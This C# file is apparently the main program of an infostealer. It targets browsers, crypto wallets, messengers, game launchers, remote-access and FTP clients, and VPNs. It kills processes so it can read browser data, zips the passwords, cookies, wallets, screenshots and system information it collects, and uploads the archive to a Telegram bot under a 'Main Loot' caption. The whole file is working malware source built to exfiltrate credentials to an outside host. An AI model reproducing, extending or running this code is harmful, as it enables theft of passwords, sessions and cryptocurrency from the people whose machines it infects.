using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Targets;
using Intelix.Targets.Applications;
using Intelix.Targets.Browsers;
using Intelix.Targets.Crypto;
using Intelix.Targets.Device;
using Intelix.Targets.Games;
using Intelix.Targets.Messangers;
using Intelix.Targets.Vpn;

namespace CvMega;

public class Program
{
	public static List<ITarget> targetsBrowsers = new List<ITarget>
	{
		new Chromium(),
		new Gecko()
	};

	public static List<ITarget> targets = new List<ITarget>
	{
		new ScreenShot(),
		new GameList(),
		new InstalledBrowsers(),
		new InstalledPrograms(),
		new ProcessDump(),
		new ProductKey(),
		new SystemInfo(),
		new WifiKey(),
		new Telegram(),
		new Discord(),
		new Element(),
		new Icq(),
		new MicroSIP(),
		new Jabber(),
		new Outlook(),
		new Pidgin(),
		new Signal(),
		new Skype(),
		new Tox(),
		new Viber(),
		new Minecraft(),
		new BattleNet(),
		new Epic(),
		new Riot(),
		new Roblox(),
		new Steam(),
		new Uplay(),
		new XBox(),
		new Growtopia(),
		new ElectronicArts(),
		new Rdp(),
		new AnyDesk(),
		new CyberDuck(),
		new DynDns(),
		new FileZilla(),
		new Ngrok(),
		new PlayIt(),
		new TeamViewer(),
		new WinSCP(),
		new TotalCommander(),
		new FTPNavigator(),
		new FTPRush(),
		new CoreFtp(),
		new FTPGetter(),
		new FTPCommander(),
		new TeamSpeak(),
		new Obs(),
		new GithubGui(),
		new NoIp(),
		new FoxMail(),
		new Navicat(),
		new RDCMan(),
		new Sunlogin(),
		new Xmanager(),
		new JetBrains(),
		new PuTTY(),
		new Cisco(),
		new RadminVPN(),
		new CyberGhost(),
		new ExpressVPN(),
		new HideMyName(),
		new IpVanish(),
		new MullVad(),
		new NordVpn(),
		new OpenVpn(),
		new PIAVPN(),
		new ProtonVpn(),
		new Proxifier(),
		new SurfShark(),
		new Hamachi(),
		new WireGuard(),
		new SoftEther(),
		new CryptoDesktop(),
		new Grabber(),
		new UserAgentGenerator(),
		new CryptoChromium(),
		new CryptoGecko()
	};

	public static StringBuilder stringBuilderError = new StringBuilder();

	public static async Task Main(string[] args)
	{
		string text = "bot token";
		string text2 = "chat id";
		string userName = Environment.UserName;
		string machineName = Environment.MachineName;
		string text3 = userName + "@" + machineName;
		string text4 = string.Join(" ", args);
		Console.WriteLine("start");
		if (text4.Contains("--run-once"))
		{
			string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crashreport.txt");
			if (File.Exists(path))
			{
				return;
			}
			File.Create(path);
		}
		InMemoryZip zip = new InMemoryZip();
		try
		{
			Counter counter = new Counter();
			Task<string> task = Task.Run(() => IpApi.GetPublicIp());
			Task.WaitAll(Task.Run(delegate
			{
				Parallel.ForEach(targets, delegate(ITarget target)
				{
					try
					{
						target.Collect(zip, counter);
					}
					catch (Exception ex4)
					{
						stringBuilderError.AppendLine("[TARGET: " + target.GetType().Name + "] " + ex4.Message);
					}
				});
			}), Task.Run(delegate
			{
				ProcessKiller.KillerAll();
				Thread.Sleep(200);
				Parallel.ForEach(targetsBrowsers, delegate(ITarget target)
				{
					try
					{
						target.Collect(zip, counter);
					}
					catch (Exception ex4)
					{
						stringBuilderError.AppendLine("[BROWSER: " + target.GetType().Name + "] " + ex4.Message);
					}
				});
			}));
			counter.Collect(zip);
			zip.AddTextFile("Error.txt", stringBuilderError.ToString());
			string text5 = "UnknownHWID";
			try
			{
				text5 = HwidGenerator.GetHwid();
			}
			catch (Exception arg)
			{
				stringBuilderError.AppendLine($"Failed to get HWID: {arg}");
			}
			string text6 = "N/A";
			try
			{
				text6 = task.Result;
			}
			catch (Exception ex)
			{
				stringBuilderError.AppendLine("Failed to get IP: " + ex.Message);
			}
			string fileName = text5 ?? "";
			StringBuilder stringBuilder = new StringBuilder();
			if (counter.Vpns.Count() > 0)
			{
				stringBuilder.AppendLine($"<b>\ud83d\udef0\ufe0f VPN:</b> <code>{counter.Vpns.Count()}</code>");
			}
			if (counter.Messangers.Count() > 0)
			{
				stringBuilder.AppendLine($"<b>\ud83d\udcac Messengers:</b> <code>{counter.Messangers.Count()}</code>");
			}
			if (counter.Games.Count() > 0)
			{
				stringBuilder.AppendLine($"<b>\ud83c\udfae Games:</b> <code>{counter.Games.Count()}</code>");
			}
			if (counter.Applications.Count() > 0)
			{
				stringBuilder.AppendLine($"<b>\ud83d\uddc4\ufe0f Servers:</b> <code>{counter.Applications.Count()}</code>");
			}
			if (counter.FilesGrabber.Count() > 0)
			{
				stringBuilder.AppendLine($"<b>\ud83c\udfa3 Grabbers:</b> <code>{counter.FilesGrabber.Count()}</code>");
			}
			string text7 = stringBuilder.ToString().TrimEnd();
			if (string.IsNullOrEmpty(text7))
			{
				text7 = "No additional data found.";
			}
			string caption = "<b>✨ New Log Received ✨</b>\n\n<blockquote><b>\ud83d\udcbb User:</b> <code>" + text3 + "</code>\n<b>\ud83c\udf0d IP:</b> <code>" + text6 + "</code>\n</blockquote>\n<b>\ud83d\udcca Main Loot:</b>\n<blockquote>" + $"<b>\ud83d\udd11 Passwords:</b> <code>{counter.Browsers.Sum((Counter.CounterBrowser b) => b.Password)}</code>\n" + $"<b>\ud83c\udf6a Cookies:</b> <code>{counter.Browsers.Sum((Counter.CounterBrowser b) => b.Cookies)}</code>\n" + $"<b>\ud83d\udcb0 Wallets:</b> <code>{counter.CryptoDesktop.Count() + counter.CryptoChromium.Count()}</code>\n" + "</blockquote>\n<b>\ud83d\udce6 Additional Data:</b>\n<blockquote>" + text7 + "\n</blockquote>\n\n<b>\ud83d\udc68\u200d\ud83d\udcbb Developer:</b> <code>@iwillcode</code>";
			await SendToTelegram(text.TrimEnd(default(char)), text2.TrimEnd(default(char)), zip.ToArray(), fileName, caption);
			Console.WriteLine("end.");
		}
		catch (Exception ex2)
		{
			Console.WriteLine("err: " + ex2.Message);
			try
			{
				File.WriteAllText("startup_error.log", ex2.ToString());
			}
			catch (Exception ex3)
			{
				Console.WriteLine("err: " + ex3.Message);
			}
		}
		finally
		{
			if (zip != null)
			{
				((IDisposable)zip).Dispose();
			}
		}
	}

	public static async Task SendToTelegram(string botToken, string chatId, byte[] file, string fileName, string caption)
	{
		if (file == null || file.Length == 0)
		{
			Console.WriteLine("File is empty, skipping send.");
			return;
		}
		try
		{
			using HttpClient httpClient = new HttpClient();
			httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
			string requestUri = "https://api.telegram.org/bot" + botToken + "/sendDocument";
			using MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(chatId), "chat_id");
			multipartFormDataContent.Add(new StringContent(caption), "caption");
			multipartFormDataContent.Add(new StringContent("HTML"), "parse_mode");
			using ByteArrayContent byteArrayContent = new ByteArrayContent(file);
			byteArrayContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
			string fileName2 = fileName + ".zip";
			multipartFormDataContent.Add(byteArrayContent, "document", fileName2);
			HttpResponseMessage response = await httpClient.PostAsync(requestUri, multipartFormDataContent);
			if (!response.IsSuccessStatusCode)
			{
				string arg = await response.Content.ReadAsStringAsync();
				string text = $"Failed to send document. Status: {response.StatusCode}, Body: {arg}";
				Console.WriteLine(text);
				File.AppendAllText("telegram_error.log", $"{DateTime.Now}: {text}\n");
			}
		}
		catch (HttpRequestException ex)
		{
			Console.WriteLine("HTTP request failed: " + ex.Message);
			File.AppendAllText("telegram_error.log", $"{DateTime.Now}: HttpRequestException: {ex}\n");
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Failed to send document: " + ex2.Message);
			File.AppendAllText("telegram_error.log", $"{DateTime.Now}: Exception: {ex2}\n");
		}
	}
}
